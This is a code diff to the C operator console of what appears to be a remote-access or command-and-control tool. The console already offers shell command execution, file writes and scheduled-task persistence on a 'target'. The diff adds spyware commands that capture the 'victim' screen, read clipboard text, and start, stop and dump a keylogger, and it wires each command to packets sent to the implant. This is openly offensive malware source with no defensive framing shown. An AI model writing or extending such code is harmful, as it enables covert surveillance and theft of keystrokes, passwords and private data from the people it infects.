@@ -10,6 +10,7 @@
 #include "protocol.h"
 #include "tls.h"
 #include "controller_utils.h"
+#include "spyware_controller.h"
 
 /* ── Cert / key paths inside the Docker container ────────────────────
  * Mounted from the host at runtime via docker-compose volumes:
@@ -94,6 +95,11 @@ static void display_prompt(int persistence)
     printf("  5 - WRITE_DATA                 Write a file to the target\n");
     printf("  6 - RUN_CMD                    Execute a shell command\n");
     printf("  7 - ENABLE PERSISTENCE         Create scheduled task on target\n");
+    printf("  8 - SCREENSHOT                 Capture victim screen\n");
+    printf("  9 - CLIPBOARD_GET              Capture clipboard text\n");
+    printf(" 10 - KEYLOG_START               Start keylogger\n");
+    printf(" 11 - KEYLOG_STOP                Stop keylogger\n");
+    printf(" 12 - KEYLOG_DUMP                Dump keylog\n");
     printf("> ");
     fflush(stdout);
 }
@@ -114,10 +120,10 @@ static int console_input(int persistence)
             flush_stdin();
 
         if ((sscanf(input_buffer, "%d", &choice) == 1) &&
-            (choice >= 1 && choice <= 7))
+            (choice >= 1 && choice <= 12))
             break;
 
-        printf("INVALID INPUT! Please enter an integer from 1-7.\n");
+        printf("INVALID INPUT! Please enter an integer from 1-12.\n");
     }
     return choice;
 }
@@ -429,6 +435,64 @@ int main(int argc, char *argv[])
                     printf("<Failed to create scheduled task.>\n\n");
                 }
                 free_packet(resp);
+                break;
+            }
+
+            case 8: { /* SCREENSHOT */
+                request_id++;
+                Packet pkt = {COMMAND_SCREENSHOT, request_id, 0, NULL};
+                send_packet(&pkt, conn);
+                Packet *resp = recieve_packet(conn);
+                if (resp && resp->command_type == COMMAND_RESPONSE) {
+                    handle_screenshot_response(resp);
+                } else if (process_response(resp, request_id, conn) == -1) {
+                    connected = 0;
+                }
+                if (resp) free_packet(resp);
+                break;
+            }
+
+            case 9: { /* CLIPBOARD_GET */
+                request_id++;
+                Packet pkt = {COMMAND_CLIPBOARD_GET, request_id, 0, NULL};
+                send_packet(&pkt, conn);
+                Packet *resp = recieve_packet(conn);
+                if (process_response(resp, request_id, conn) == -1)
+                    connected = 0;
+                break;
+            }
+
+            case 10: { /* KEYLOG_START */
+                request_id++;
+                Packet pkt = {COMMAND_KEYLOG_START, request_id, 0, NULL};
+                send_packet(&pkt, conn);
+                Packet *resp = recieve_packet(conn);
+                if (process_response(resp, request_id, conn) == -1)
+                    connected = 0;
+                break;
+            }
+
+            case 11: { /* KEYLOG_STOP */
+                request_id++;
+                Packet pkt = {COMMAND_KEYLOG_STOP, request_id, 0, NULL};
+                send_packet(&pkt, conn);
+                Packet *resp = recieve_packet(conn);
+                if (process_response(resp, request_id, conn) == -1)
+                    connected = 0;
+                break;
+            }
+
+            case 12: { /* KEYLOG_DUMP */
+                request_id++;
+                Packet pkt = {COMMAND_KEYLOG_DUMP, request_id, 0, NULL};
+                send_packet(&pkt, conn);
+                Packet *resp = recieve_packet(conn);
+                if (resp && resp->command_type == COMMAND_RESPONSE) {
+                    handle_keylog_dump_response(resp);
+                } else if (process_response(resp, request_id, conn) == -1) {
+                    connected = 0;
+                }
+                if (resp) free_packet(resp);
                 break;
             }
 
